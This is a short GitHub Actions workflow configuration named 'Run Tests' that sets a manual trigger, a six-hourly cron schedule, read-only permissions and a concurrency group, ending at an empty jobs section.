name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '50 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
